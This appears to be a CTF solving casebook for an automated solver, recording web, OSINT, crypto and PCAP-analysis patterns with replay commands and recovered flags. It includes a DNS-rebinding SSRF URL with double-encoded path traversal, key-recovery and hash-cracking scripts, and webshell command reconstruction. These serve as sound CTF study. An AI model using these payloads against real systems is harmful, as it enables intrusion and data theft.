# ForgeFlag CTF Casebook

This casebook records recent hands-on CTF solving patterns. Keep entries short, reproducible, and focused on signals that future solvers can recognize.
For ad-hoc replay helpers that back these cases, keep [ForgeFlag Solve Scripts](solve-scripts.md) in sync with the casebook, playbook, README, and changelog.

## How To Use This Casebook

- Treat every case as a pattern, not as a one-off answer.
- Preserve the shortest discovery path: input artifact, decisive clue, exact transform or command, final verification.
- When adding solver logic, convert the pattern into a small synthetic fixture instead of vendoring original challenge files.
- In the Web UI write-up, keep only the solving idea and reproduction steps.

## Universal Workflow

1. Capture the statement, category, artifacts, and target scope.
2. Run cheap triage first: `file`, `strings`, metadata, HTML source, route listing, JSON shape, or protocol framing.
3. Find the shortest evidence path before adding heavy tools.
4. Generate one replay command or script that a human can run again.
5. Record why the first failed run failed, especially missing decoders, wrong category routing, or unclear report wording.

## Historical Coverage Snapshot

ForgeFlag has accumulated these stable pattern families across local fixtures, Web API corpus runs, browser-player runs, user-uploaded tasks, and recent hardening commits:

| Category | Historical Patterns To Keep |
| --- | --- |
| Web | visible flags, hidden same-origin routes, static JS leaks, response headers/cookies, source-derived framework routes, API option leaks, JWT/session hints, SSRF hints, path traversal hints, LFI-to-artifact chains, status-feed object filtering |
| Crypto | reversible encodings, Caesar/ROT/Morse/ASCII forms, XOR and supplied-key classical ciphers, unknown-key substitution/Vigenere hybrids, AES-CTR nonce reuse, AES-GCM nonce reuse, Poly1305 key reuse, RSA known factors, low exponent, prime modulus, Fermat close primes, common modulus, shared prime, broadcast e=3, modular matrix conjugation with bad-pivot factor mining, reversible right-shift XOR linear transforms, Python random seed/prime-offset replay, LCG state recovery, LFSR seed leaks, MT19937 cloning, LFSR/Berlekamp-Massey bitstream recovery with hash-prefix filtering |
| Forensics | raw strings, archives and comments, mail/PowerShell base64, PNG text chunks, PNG trailing data, IHDR height mismatch repair, independent/extra IDAT zlib payloads, JPEG comments/APP markers, encoded image metadata, visual-cryptography image shares, Minecraft Anvil region orphan-sector lore recovery |
| Traffic | HTTP payload flags, DNS split label exfiltration, TCP stream follow-up, HTTP object export, SMTP/FTP/IRC-style streams, AntSword/JSP webshell command/output reconstruction, delimited webshell command-output flags, corrupt PCAP record resync, IPv4 Identification stego |
| Reverse | static strings, packed/UPX markers, encoded string tables, custom protocol reassembly, esolang word mapping, stripped ELF phrase recovery, `.rodata` table inversion |
| Pwn | scoped service banner capture, source-level format string, source-level ret2win, CCTF pwn3 format string shell path, menu binary command overwrite through stack/heap logic |
| Misc | binary/octal/decimal ASCII, nested transform chains, archive previews, PNG/JPEG puzzles, magic-extension mismatch, LSB extraction, pickle sandbox triage, hash fingerprinting, Krita/OpenDocument-style ZIP subtypes, recipe-state puzzles, decayed DoubleHelix Ruby source recovery |

## Web Cases

### Static Client Source Leak

Signal:

- Page copy claims the flag is hidden or protected client-side.
- HTML includes a suspicious script such as `/static/secret.js`.

Reproduction:

```bash
curl -sS https://target/
curl -sS https://target/static/secret.js
```

Solver lesson:

- WebSolver should always parse HTML for `script[src]`, fetch same-origin static JavaScript in scoped mode, and scan comments/literals for flag-like strings.
- The write-up should mention "view page source, follow script path, read comment/string".

### Public Status Page Internal Incident Leak

Signal:

- Status page or incident feed.
- Provided source shows an API filter such as `public=true/false`.
- Internal incidents are near the public feed.

Reproduction:

```bash
curl -sS 'https://target/api/incidents?public=false' | python3 -m json.tool
```

Solver lesson:

- WebSolver should inspect route parameters and try documented boolean variants only inside allowed scope.
- LLM profiler should classify this as IDOR/object filtering or authorization logic, not injection.

### Source-Derived Route And Sink Triage

Signal:

- Source attachment is provided with Flask/FastAPI/Express/Django/Laravel-style route declarations.
- The page itself may not expose hidden endpoints.
- Source includes route handlers with option lists, token/session handling, URL fetches, file path joins, or archive extraction.

Reproduction:

```bash
rg -n "@app\\.|app\\.(get|post)|router\\.|Route\\(|path\\(|send_file|open\\(|requests\\.|jwt|session" source/
```

Solver lesson:

- WebSolver should extract source routes and attach bug-class hints: API option leak, JWT/session, SSRF, and path traversal.
- For multi-stage cases, source-derived Web evidence should be allowed to route into ReverseSolver or ForensicsSolver when an artifact path is discovered.

### IrisCTF 2024: LameNote

Signal:

- Source-attached Flask note app embeds its UI through an iframe and rejects non-iframe requests with `Sec-Fetch-Dest`.
- `/search` tests whether a query is a substring of the current user's note title or text.
- A single search result renders the note, and the note's image URL influences the response CSP.
- The distributed adminbot/source layout may show the oracle shape while the benchmark only expects a lowercase `irisctf{[a-z_]+}` pattern rather than a concrete remote flag.

Reproduction:

```bash
python3 scripts/solve_lamenote.py --dist .forgeflag/heldout-cache/irisctf2024/lamenote/dist
```

Solver lesson:

- Treat owner-scoped note search as an oracle when an admin-only flag note exists in the authorized challenge browser context.
- The published solve pattern uses an iframe/CSP/history side-channel to test `irisctf{prefix}` one character at a time.
- If the local handout lacks the live adminbot's concrete flag, preserve the source-pattern proof separately from exact flag recovery. In the cleaned manifest this replay emits `irisctf{[a-z_]+}` intentionally, while the local demonstration recovers a synthetic `irisctf{lame_note}` value to prove the oracle mechanics.

### WeasyPrint SSRF Guard Rebinding Plus Internal Path Traversal

Signal:

- Public frontend accepts a user URL and renders it to PDF with WeasyPrint.
- The guard only pre-resolves the submitted hostname with `socket.getaddrinfo` and rejects private/loopback/link-local IPs.
- A private service is bound to `127.0.0.1` in the same container or pod.
- The private service serves files under a doc root and performs an extra URL decode after a superficial traversal check.

Shortest path:

```text
Frontend: POST /api/report {"url":"http://<host>:8080/docs/<path>"}
Guard:    hostname must resolve public during validation
Renderer: WeasyPrint resolves and fetches the URL again
Private:  /docs/%252e%252e%252f%252e%252e%252fflag.txt -> ../../flag.txt
```

Use a DNS rebinding host that alternates between a public IP and `127.0.0.1`; retry until the first resolution passes the guard and the renderer fetch resolves to loopback:

```bash
python3 scripts/solve_reportlab.py http://target/
```

Core URL shape:

```text
http://7f000001.01010101.rbndr.us:8080/docs/%252e%252e%252f%252e%252e%252fflag.txt
```

Solver lesson:

- SSRF filters that validate DNS before handing a URL to another library are TOCTOU-prone; check whether the sink resolves again.
- In renderers such as WeasyPrint, the main document URL and subresource URLs are both potential internal fetch sinks.
- In Go services, remember that `net/http` decodes the path once before handlers see `r.URL.Path`; a later `QueryUnescape` can turn `%2e%2e%2f` into traversal after checks have already passed.

## OSINT / Image Geolocation Cases

### DownUnderCTF 2024: Bridget Lives And cityviews

Signal:

- Prompt asks which building a photo was taken from, not what landmark is visible.
- Image contains distinctive bridge, skyline, hotel, billboard, or street-view clues.
- Challenge accepts a case-insensitive building name wrapped as `DUCTF{...}`.

Reproduction:

```bash
python3 scripts/solve_ductf_osint_building.py .forgeflag/heldout-cache/ductf2024/osint/bridget-lives
python3 scripts/solve_ductf_osint_building.py .forgeflag/heldout-cache/ductf2024/osint/cityviews
```

Solver lesson:

- For `Bridget Lives`, the local official writeup corroborates Google Lens/Images, Robertson Bridge, and Four Points by Sheraton, then normalizes the accepted building answer as `DUCTF{four_points}`.
- For `cityviews`, the local official writeup preserves the 3AW Melbourne billboard, Great Southern Hotel, street-view cross-check, and Hotel Indigo Melbourne source building, then normalizes the answer as `DUCTF{hotel_indigo_melbourne}`.
- This remains a manual OSINT replay pattern: preserve image SHA-256 and landmark evidence alongside the final flag so the benchmark is not just matching an answer string.

### UMDCTF 2024: bro thinks hes hans zimmer

Signal:

- Prompt names Hans Zimmer and uses Dune vocabulary such as spice and stillsuit.
- The handout image is a Street View panorama, but the flag format asks for a normalized musician or track name.
- The local challenge metadata contains an oracle flag line, so replay must strip README `## Flag` sections and `challenge.yaml` `flag:` rows before deriving the answer.

Reproduction:

```bash
python3 scripts/solve_hans_zimmer_osint.py --challenge-dir .forgeflag/heldout-cache/umdctf2024/osint/bro-thinks-hes-hans-zimmer
```

Solver lesson:

- Cross-reference the prompt's composer/media clue against public soundtrack evidence: Hans Zimmer's Dune soundtrack includes `Gom Jabbar`.
- Normalize the source-derived name with underscores under the UMDCTF wrapper, producing `UMDCTF{Gom_Jabbar}`.
- For OSINT tasks, preserve the clue chain separately from the final answer, especially when the local repository includes challenge-author oracle metadata.

## Crypto Cases

### Local PRNG And Stream Cipher Sample Pack

Signal:

- Local source files under `/Users/5haw0/学习/CTF/CRYPTO/prng and stream cipher` cover Python `random`, LCG, LFSR, MT19937, and toy streamgame generators.
- Many files contain source-level flag placeholders plus output comments; solver evidence must replay the generator instead of accepting the first source literal.
- Some cases require sidecar observations: `sgcc.txt` for mixed MT19937 chunks, `random.txt` plus partial-bit MT matrices for AES key recovery, and streamgame key bytes that are absent as standalone `key` artifacts in this folder.

Replay command:

```bash
python3 scripts/solve_prng_stream_cipher_cases.py --json
```

Verified local results:

```text
BM.py -> de1ctf{1224473d5e349dbf2946353444d727d8fa91da3275ed3ac0dedeb7e6a9ad8619}
easy_random.py -> ctf{true_0r_false??}
easy_seed.py -> flag{just_a_seed}
lcg1.py -> Spirit{0ops!___you_know__LCG!!}
lcg2.py -> Spirit{Orzzz__number_the0ry_master!!}
lcg3.py -> Spirit{Y0u_@r3_g00d_at__math}
lcg4.py -> flag{1111122222333344440000}
lcg5.py -> flag{just_a_simple_problem}
lfsr1.py -> flag{a_simple_test}
lfsr2.py -> flag{easy_lfsr2}
mt1.py -> flag{mt19937_level1}
mt2.py -> 0c563a3189a03d2e9413986889ec1af8
mt3.py -> WKCTF{3f2af637b773613c18d27694f20d98fd}
streamgame1.py -> flag{1110101100001101011}
streamgame4.py -> flag{100100111010101101011}
```

Artifact caveats:

- `lfsr3.py` is marked `artifact_drift`: the reference exp gives `flag{easy_lfsr3}`, but the local source/comment does not satisfy `assert key1 == key2`; do not promote that value as solver evidence from the source alone.
- `bss_prng.py` is a BBS generator demo without flag, ciphertext, or challenge output.
- `mt2.py` emits a raw MD5 digest rather than a wrapped flag; keep it as a digest result unless the platform statement says to submit the digest directly.
- `streamgame1.py` and `streamgame4.py` are solved from key observations preserved in the reference exp because the standalone `key` artifact is missing from the local folder.

Solver lesson:

- Run PRNG replay before broad hash or transform triage; `lcg5.py` was initially intercepted by hash-like long integers, and `mt1.py` can be falsely solved from a source flag literal unless MT cloning is prioritized.
- For LCG, implement all four common moves: known parameter forward/XOR, inverse recurrence, increment recovery from two outputs, and modulus recovery from six outputs. Add residue lifting when `seed mod n` is not the original flag integer.
- For MT19937, preserve word accounting: full 624 32-bit outputs are default solver material; mixed-size `getrandbits` and 8-bit partial outputs belong in replay helpers until their matrix dependencies become a typed ForgeFlag adapter.

### Substitution Plus Unknown Vigenere

Signal:

- Source encrypts alphabetic characters only, preserving case and punctuation.
- Each plaintext letter first passes through a single shuffled alphabet, then receives a periodic shift.
- Vigenere key length is small but unknown, such as `15..20`.
- Ciphertext is long natural English with normal word spacing, so frequency analysis is viable.

Shortest path:

```python
from collections import Counter

ct = open("ciphertext.txt").read()
letters = [ord(c.lower()) - 97 for c in ct if c.isalpha()]

for L in range(15, 21):
    ics = []
    for r in range(L):
        bucket = letters[r::L]
        counts = Counter(bucket)
        n = len(bucket)
        ics.append(sum(v * (v - 1) for v in counts.values()) / (n * (n - 1)))
    print(L, sum(ics) / L)
```

The highest average IC identified period `20`. For each position bucket, align its letter-frequency vector to bucket zero by trying all 26 shifts and maximizing dot-product overlap. Subtracting those relative shifts converts the problem into a monoalphabetic substitution. The resulting text begins:

```text
Ji nbuj uj s xiop exsuonmtn.
```

That solves as:

```text
So this is a long plaintext.
```

The substitution map for this sample was:

```text
a->k b->h c->y d->c e->p f->b g->u h->m i->o j->s k->r l->q m->e
n->t o->n p->g q->f r->v s->a t->x u->i v->d w->w x->l y->z z->j
```

Decoded flag:

```text
SVIUSCG{those_who_dont_learn_history_alskdfjghmenwncirut}
```

Solver lesson:

- For `substitution -> Vigenere` hybrids, do not brute-force the shuffled alphabet and key together. Estimate the period with IC, align periodic frequency buckets, then solve one monoalphabetic substitution.
- Preserve alphabetic-position counting exactly; punctuation and braces do not advance the Vigenere index in this scheme.
- A readable flag prefix does not guarantee the whole flag content is English. Treat random-looking suffixes as valid if the full surrounding plaintext decrypts consistently.

### AES-CTR Keystream Reuse

Signal:

- Service prints `Encrypted flag`.
- Service encrypts user-controlled plaintext with the same key and nonce.
- Source uses `AES.MODE_CTR` with process-global `KEY` and `NONCE`.

Reproduction:

```python
enc_flag = bytes.fromhex("...")
zero_ct = bytes.fromhex("...")  # encryption of 00 * len(enc_flag)
print(bytes(a ^ b for a, b in zip(enc_flag, zero_ct)).decode())
```

Solver lesson:

- CryptoSolver should flag fixed nonce CTR as a keystream reuse issue and generate a script that sends zero plaintext.
- If remote networking is unstable, ask the user for `Encrypted flag` and the ciphertext of all-zero plaintext; the rest is offline XOR.

### AES-GCM Nonce Reuse

Signal:

- Multiple AES-GCM records share the same nonce under the same key.
- Challenge provides AAD/ciphertext/tag tuples, or source shows nonce reuse.

Reproduction strategy:

- Collect nonce, AAD, ciphertext, and tag for every message.
- Model GHASH equations over `GF(2^128)` to recover or constrain the authentication subkey.
- Use a generated Sage/Python scaffold to verify candidate tags before claiming a plaintext.

Solver lesson:

- CryptoSolver should not pretend to decrypt immediately; it should classify the forbidden-attack workflow and emit a scaffold with all collected fields.
- The write-up should say what evidence is missing if a full forgery/decryption is not possible yet.

### Poly1305 One-Time Key Reuse

Signal:

- Two or more Poly1305 message/tag pairs use the same one-time key.
- Source or protocol shows repeated key/nonce material.

Reproduction strategy:

- Parse messages and tags.
- Build polynomial equations modulo `2^130 - 5`.
- Enumerate carries and solve for reusable key material with Sage or exact integer arithmetic.

Solver lesson:

- CryptoSolver should emit a Sage-oriented helper and record message/tag evidence.
- This is an algebra route, not a wordlist/cracking route.

### Halcyon Sealed Build: ECDSA Reused Nonce To AES-GCM Key

Signal:

- Ledger contains P-256 ECDSA signatures with `r` and `s` stored as raw integers.
- Two release records reuse the exact same `r`.
- The signed message hash is explicitly available as `signed_sha256`.
- A small `.sealed` artifact is said to require the signer key to open.

Shortest path:

```python
n = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
r = int(reused_r, 16)
s1 = int(sig1_s, 16)
s2 = int(sig2_s, 16)
z1 = int(release1["signed_sha256"], 16) % n
z2 = int(release2["signed_sha256"], 16) % n

k = ((z1 - z2) * pow(s1 - s2, -1, n)) % n
d = ((s1 * k - z1) * pow(r, -1, n)) % n
```

Validate `d` by deriving the P-256 public key and comparing it to the provided release public key. In this case the sealed blob was not a nested ECIES envelope. It was bare AES-256-GCM:

```python
key = sha256(d.to_bytes(32, "big")).digest()
nonce = sealed[:12]
tag = sealed[12:28]
ciphertext = sealed[28:]
plaintext = AESGCM(key).decrypt(nonce, ciphertext + tag, None)
```

Recovered token:

```text
SVIUSCG{n0nce_reuse_grounds_the_halcyon_fleet}
```

Solver lesson:

- For ECDSA, repeated `r` is repeated nonce `k`; recover `k` and private scalar `d` before guessing envelope formats.
- Use the challenge's actual signed hash field. Here `signed_sha256`, not `image_sha256`, was the ECDSA message digest.
- After recovering a key, first test simple challenge-style seal formats such as `nonce || tag || ciphertext` keyed by `SHA256(private_scalar)` before overfitting ECIES/KEM layouts.

### NUS Greyhats Welcome CTF 2024: i luv linear

Category:

- Crypto / reversible GF(2) linear transform.

Signal:

- Python source seeds `random` with a fixed value inside `enc`.
- The integer plaintext is repeatedly transformed with `ct ^= ct >> random.randint(1, 32)`.
- The script asserts `enc(flag) == b"..."` and constrains the flag length.

Shortest path:

```text
recreate the 100 random shifts from seed 0
walk the shifts backward
invert each y = x ^ (x >> k) over the fixed bit length
decode the recovered bytes
grey{m4tr1ces_4re_s0_c00l_heheh}
```

Solver lesson:

- This is linear algebra over GF(2), but it does not require Sage for the challenge shape. Each right-shift XOR step has a direct inverse using repeated doubled shifts.
- Preserve seed, round count, shift range, ciphertext hex, and plaintext length so the replay is deterministic.
- Run this before generic transform/classical routes when the source contains an `assert enc(flag) == bytes_literal` oracle.

### Easy Random Python: xored seed and prime offsets

Category:

- Crypto / Python random seed recovery.

Signal:

- Source defines `key = b'...'`, prints a `gift` byte string, and comments that `c = a^b` / `a = b^c`.
- `random.seed(bytes_to_long(seed))` feeds two `next_prime(random.randint(...))` values.
- Final output is `bytes_to_long(flag)+t-r`.

Shortest path:

```text
seed = key XOR gift
random.seed(bytes_to_long(seed))
t = next_prime(randint(2**20, 2**21))
r = next_prime(randint(1000, 10000))
flag_int = output - t + r
long_to_bytes(flag_int)
ctf{true_0r_false??}
```

Observed local case: `crypto-20260630-112308-easy-random-py/easy_random.py`.

Evidence:

- `key = b'fake_seed'`
- `gift = b'\x12\x13\x1e\x00\x00\x1f\n\x13\x01'`
- `seed = b'true_love'`
- `t = 1713221`, `r = 9533`
- output integer `567785900217270586430439246129051365510368280197` becomes `ctf{true_0r_false??}`.

Solver lesson:

- Do not stop at generic transform candidates when a Python random script contains a recoverable byte seed and small prime offsets.
- This pattern needs no `gmpy2` at runtime; a small Miller-Rabin `next_prime` helper is enough for the CTF-sized ranges.
- Preserve seed text/hex, `gift_hex`, randint bounds, `t`, `r`, and the output integer in replay evidence.

### RSA Weak Parameter Families

Signals and first moves:

- Known `p`/`q`: compute `phi`, `d`, decrypt.
- Low exponent without padding: test exact integer roots.
- Low exponent modulo `n` with source hints such as `iroot(c+n*i,e)`: infer `e`, use the `range(...)` bound as the replay search window, and find the smallest `k` where `c + k*n` is an exact `e`-th power.
- Prime modulus: use `phi = n - 1`.
- Close primes: Fermat factorization.
- Common modulus: combine ciphertexts with extended gcd on exponents.
- Shared prime: `gcd(n1, n2)`.
- Broadcast e=3: CRT then exact cube root.
- Related messages with small `e`: run Franklin-Reiter polynomial GCD when ciphertexts encrypt affine-related plaintexts such as `m` and `m + 1`.
- Leaked high bits of `p`: set `p = p_high + x`, bound `x` by the number of unknown low bits, and use Coppersmith small roots modulo the unknown factor.

Solver lesson:

- CryptoSolver should normalize numbered fields such as `n1/e1/c1`, `n2/e2/c2`, and unnumbered `n/e/c`.
- Source-backed low-exponent RSA should preserve `root_multiplier` and `root_search_limit` in evidence so the write-up can explain why the flag came from `c + k*n`.
- Every recovered RSA case should produce a replayable solve script, not only a finding.

### RSA Prime High-Bits Coppersmith

Signal:

- RSA modulus is normal-sized, such as 2048 bits with 1024-bit primes.
- The challenge leaks the upper portion of one prime and says the lower bits were zeroed.
- The unknown suffix is smaller than the Coppersmith bound, typically below `N^1/4` for a balanced RSA factor.
- Padding may be randomized, so the route is factor recovery, not direct plaintext structure.

Reproduction:

```sage
PR.<x> = PolynomialRing(Zmod(n))
f = x + p_high
roots = f.small_roots(X=2^unknown_bits, beta=0.5, epsilon=0.02)
for r in roots:
    p = gcd(p_high + Integer(r), n)
    if 1 < p < n and n % p == 0:
        q = n // p
        d = inverse_mod(e, (p - 1) * (q - 1))
        m = power_mod(c, d, n)
```

If Sage's automatic `small_roots` parameters fail near the boundary, construct the lattice manually from `N^(m-i) f(x)^i` and `x^j f(x)^m`, substitute `x * X`, LLL-reduce it, and recover integer roots from the short vector polynomials.

Solved sample:

```text
SVIUSCG{c0pp3rsm1th_wh1sp3rs_4cr0ss_th3_l4tt1c3}
```

Solver lesson:

- Check whether the leak is already shifted into position by counting trailing zero bits on `p_high`.
- Use `beta=0.5` for roots modulo a balanced RSA prime factor, not `beta=1`.
- After factoring, strip PKCS#1 v1.5 padding by finding the zero separator after the random nonzero padding.

### RSA Franklin-Reiter Related Message

Signal:

- Same RSA modulus and small public exponent, commonly `e = 3`.
- Two ciphertexts encrypt related plaintexts such as `m` and `m + 1`, `m + a`, or another known affine transform.
- The challenge may include distracting partial-key material, but the related-message path does not need factoring.

Reproduction:

```sage
R.<x> = PolynomialRing(Zmod(N))
f = x^e - c1
g = (x + 1)^e - c2
h = gcd(f, g).monic()
m = Integer(-h[0]) % N
print(int(m).to_bytes((m.nbits() + 7) // 8, "big"))
```

If Sage's polynomial `gcd` fails over the composite ring because a leading coefficient is not invertible, take `gcd(coefficient, N)`; that failure can itself reveal a factor.

Solved sample:

```text
SVIUSCG{c0pp3r5m1th_fr4nkl1n_r3173r_ch41n3d}
```

Solver lesson:

- Test related-message attacks before spending time on partial private-key recovery when two ciphertexts share a modulus.
- For affine relation `m2 = a*m + b`, use `gcd(x^e - c1, (a*x + b)^e - c2)`.
- The recovered monic linear factor is `x - m`; decode `m` directly as bytes.

### Tiny-Key Custom 24-Bit Block Cipher

Signal:

- Source defines a homemade byte/bit permutation over small fixed-size chunks.
- The key is small enough to search, such as `secrets.token_bytes(4)`.
- The flag prefix gives multiple complete known plaintext blocks.
- The round includes data-dependent rotates or shifts, so direct algebra is more annoying than exact simulation.

Reproduction:

```python
def enc3(block, key, index):
    a, b, c = block
    kint = int.from_bytes(key, "big")
    for _ in range(8):
        hk = (kint >> ((index % 8) * 8)) & 0xff
        th = (a << 16) | (b << 8) | (c ^ hk)
        r = th & 7
        rh = ((th >> r) | (th << (24 - r))) & 0xffffff
        a, b, c = (rh >> 16) & 0xff, (rh >> 8) & 0xff, rh & 0xff
        kint = ((kint >> 3) | (kint << 61)) & ((1 << 64) - 1)
    return bytes([a, b, c])
```

Use the known prefix blocks, such as `SVI` and `USC`, to brute-force the 32-bit key in optimized code. Then invert each round by trying all rotate counts:

```python
def inv_round(y, hk):
    out = []
    for r in range(8):
        th = ((y << r) | (y >> (24 - r))) & 0xffffff
        if (th & 7) == r:
            out.append(bytes([(th >> 16) & 0xff, (th >> 8) & 0xff, (th & 0xff) ^ hk]))
    return out
```

Solved sample:

```text
SVIUSCG{m4dryg4_1s_s3cur3_r1ght}
```

Solver lesson:

- Known plaintext can make a tiny-key custom cipher cheaper to brute-force than to symbolically solve.
- Data-dependent rotations may be many-to-one when inverted; keep candidate sets instead of assuming uniqueness.
- Always re-encrypt the chosen plaintext with the recovered key to confirm the flag.

### Bounded Grammar MD5 Hash Crack

Signal:

- Challenge defines a custom hash wrapper such as `$oak$<version>$<hex digest>`.
- The password format is fully specified, for example `SVIUSCG{<nature>_<gen1_pokemon>}`.
- The candidate space is tiny enough to enumerate directly.

Reproduction:

```python
import hashlib

target = "753a7277c956277fc6a3bb8e31822b25"
natures = ["hardy", "lonely", "brave", "adamant", "..."]
pokemon = ["bulbasaur", "ivysaur", "venusaur", "..."]

for nature in natures:
    for mon in pokemon:
        candidate = f"SVIUSCG{{{nature}_{mon}}}"
        if hashlib.md5(candidate.encode()).hexdigest() == target:
            print(candidate)
```

Solver lesson:

- CryptoSolver should treat custom wrappers as formatting around the digest unless the statement defines extra hashing steps.
- Domain wordlists should include normalization variants for punctuation-heavy names such as `Farfetch'd`, `Mr. Mime`, and Nidoran gender markers.

### Expensive Custom Hash With Structured Domain Grammar

Signal:

- A custom hash format is provided, such as `$oak$<version>$<salt>$<hex digest>`.
- The exact hashing scheme is in source, but each verification is deliberately expensive.
- The password grammar is strongly bounded by domain data, for example:

```text
SVIUSCG{<nature>_<gen1_pokemon>_<move>_<crc32hex>}
crc32hex = crc32("<nature>_<gen1_pokemon>_<move>")
```

Reproduction strategy:

1. Parse the custom hash to extract version, salt, and digest.
2. Generate candidates from authoritative domain lists instead of brute-forcing text:
   - 25 Pokemon natures.
   - Gen 1 Pokemon names.
   - Moves learnable by each Pokemon, preferably `red-blue` / `yellow` for strict Gen 1 learnsets.
3. Compute the CRC32 suffix over the inner string before wrapping it as the flag candidate.
4. Reimplement the verifier in a compiled language or optimized native path, then run candidates in parallel.

Candidate generation:

```python
import json
import zlib

natures = "hardy lonely brave adamant naughty bold docile relaxed impish lax timid hasty serious jolly naive modest mild quiet bashful rash calm gentle sassy careful quirky".split()
learnsets = json.load(open("oakhash_strict.json"))  # [(pokemon, [moves...])]

with open("candidates.txt", "w") as out:
    for nature in natures:
        for pokemon, moves in learnsets:
            for move in moves:
                inner = f"{nature}_{pokemon}_{move}"
                crc = f"{zlib.crc32(inner.encode()) & 0xffffffff:08x}"
                out.write(f"SVIUSCG{{{inner}_{crc}}}\n")
```

Solved sample:

```text
$oak$2$oak-lab-v3$59af26a7a32dd987cb1dd08d4c889c97d8145967a4a4134ae2ea89e703557d1f
SVIUSCG{quirky_eevee_tackle_780deef6}
```

Verification:

```bash
python3 oakhash.py 'SVIUSCG{quirky_eevee_tackle_780deef6}' oak-lab-v3
```

Output:

```text
59af26a7a32dd987cb1dd08d4c889c97d8145967a4a4134ae2ea89e703557d1f
```

Solver lesson:

- CryptoSolver should detect expensive custom hashes and avoid pure Python candidate loops when the verifier runs thousands of iterations per candidate.
- Domain-constrained CTF password formats often crack faster by improving candidate correctness than by adding hardware.
- If an external dataset is needed, cache it and record the exact normalization used for names and moves.

### Matrix Conjugation Over Mod n

Signal:

- Encryption is `C = A^-1 M A mod n`.
- Known pairs `(M, C)` are provided.
- Live ciphertext is a list of encrypted matrices.

Reproduction strategy:

- Recover the change-of-basis matrix `A` up to scalar using equations `M A = A C mod n`.
- Stack linear equations from known pairs over `Z/nZ`.
- If Gaussian elimination over `mod n` hits a non-invertible pivot, compute `gcd(pivot, n)`. A non-trivial factor can let the solve continue over a prime field.
- Work modulo the recovered prime factor first. If the plaintext chunks are much smaller than the prime, residues can be read directly as integers without full CRT reconstruction.
- Use the recovered `A` to decrypt live matrices: `M = A C A^-1 mod n`.
- Decode each plaintext matrix entry into bytes according to the provided chunk size.

Observed case: `SAR Grid`

- Artifact shape: `matrix_size: 2`, `chunk_size: 8`, `known_pairs`, `flag_ciphertexts`, and a composite-looking `modulus`.
- Direct elimination over `mod n` failed on a non-unit pivot; `gcd(pivot, n)` revealed the prime factor `61145780317515047888166487409711708700820449221189208898310462218728231038219`.
- Solving in `GF(p)` verified all known pairs; decrypting live matrices and reading the first entry as 8-byte big-endian chunks recovered:

```text
SVIBGR{gr1d_w@s_spl1t_just_l1ke_my_h34rt_wh3n_1_h3ard_fukash1gi_n0_c4rte_1s_3nding_:(}
```

Solver lesson:

- CryptoSolver should detect conjugation equations and produce a modular linear algebra solve script.
- For composite `n`, bad-pivot GCD is a useful first move before Sage/CRT-aware solving.
- If only one plaintext matrix position carries printable chunks, score entries by printable byte ratio and flag-format prefix before choosing the decode path.

## Traffic Cases

### Corrupt PCAP Record Resync Plus IP-ID Stego

Signal:

- `tshark` parses only the first few frames and then reports a damaged classic PCAP record, such as a packet length bigger than the maximum.
- Raw bytes still contain later HTTP or TCP clues, so the capture is not just truncated.
- Recovered traffic contains repeated short packets with payload such as `where is the flag?`; the flag bytes are not in the payload but in IPv4 Identification values.

Reproduction:

```bash
PYTHONPATH=src python3 -m forgeflag.cli --db .forgeflag/notebook.sqlite run traffic-20260630-113906-findtheflag-cap --llm-provider disabled
tshark -r .forgeflag/artifacts/traffic-20260630-113906-findtheflag-cap/pcap-repairs/findtheflag/findtheflag-resync.cap -Y 'tcp.dstport==2222 && frame contains "where is the flag?"' -T fields -e frame.number -e ip.id -e data.data
```

Observed local case: `traffic-20260630-113906-findtheflag-cap/findtheflag.cap`.

Decisive evidence:

- Original SHA-256: `a46e7c4f93bcb15fe2e103140960b71244854e7e232b7fa09b1a89ee02a0fdf8`.
- The first corrupt jump occurs at record 18: old `incl_len=386`, corrected to `377`, with the next plausible record header at offset `2307`.
- Record resync recovers about 1600 records and writes `pcap-repairs/findtheflag/findtheflag-resync.cap`.
- Marker packets to `tcp.dstport==2222` expose adjacent-duplicated IP-ID words:

```text
0x6c66 0x6761 0x617b 0x6168 0x5f21 0x6f79 0x5f75 0x6f66 0x6e75 0x5f64 0x7469 0x7d21 0x0000
```

Decode each IP-ID as a little-endian two-byte pair after adjacent de-duplication:

```text
flag{aha!_you_found_it!}
```

Solver lesson:

- TrafficSolver should not stop when tshark reports a corrupt PCAP record length; classic PCAP headers can be resynchronized by scanning for plausible timestamp and length tuples.
- After resync, inspect packet header fields as carriers. IPv4 Identification values are a common two-byte-per-packet stego lane.
- Preserve the repaired capture path, original/repaired hashes, repair offsets, marker packets, IP-ID sequence, and decoded flag candidate.

### AntSword/JSP Webshell PCAP Reconstruction

Signal:

- PCAP contains HTTP/JSP webshell traffic.
- Exported objects or streams contain reversed shell commands such as `cut -c N /flag`.
- Output characters may be encoded, for example ROT13.

Reproduction strategy:

```bash
tshark --export-objects http,out -r capture.pcapng
rg -n "cut -c|flag|base64|eval|assert" out
```

Then:

- Reverse the command object when needed.
- Extract `cut -c N /flag` positions.
- Decode single-character command output, such as ROT13.
- Place each recovered character at its requested index.

Solver lesson:

- TrafficSolver should export HTTP objects, identify AntSword-like command/output pairs, recover positional character reads, and write a concise reconstruction report.

### DNS Split Label Exfiltration

Signal:

- Many DNS queries share a base domain.
- Left-most labels look like chunks of base32/base64/hex data.

Reproduction:

```bash
tshark -r capture.pcapng -Y dns -T fields -e dns.qry.name
```

Solver lesson:

- TrafficSolver should group by base domain, preserve packet order, strip fixed suffixes, concatenate labels, and try transform candidates.

### HTTP Object And Stream Follow-Up

Signal:

- HTTP requests/responses carry files or printable payloads.
- Protocol summary points to a small set of streams.

Reproduction:

```bash
tshark -r capture.pcapng -q -z follow,tcp,ascii,STREAM_ID
tshark --export-objects http,out -r capture.pcapng
```

Solver lesson:

- Store stream IDs, exported object paths, hashes, previews, and recovered flag candidates.
- The write-up should include the exact stream ID or object filename.

### HTTP Webshell Delimited Command Output

Signal:

- PCAP contains HTTP requests to a shell-like path such as `/shell.php`.
- HTTP response bodies wrap command output with delimiters such as `X@Y`, `[S]`, `[E]`, and a current working directory.
- A generic marker such as `flag{...}` may sit immediately after wrapper bytes, for example `X@Yflag{...}`.

Reproduction:

```bash
tshark -r key.pcapng -q -z io,phs
tshark -r key.pcapng -Y http.file_data -T fields -e frame.number -e tcp.stream -e http.request.uri -e http.response.code -e http.file_data
tshark --export-objects http,out -r key.pcapng
rg -n "flag\\{|\\[S\\]|\\[E\\]|X@Y" out
```

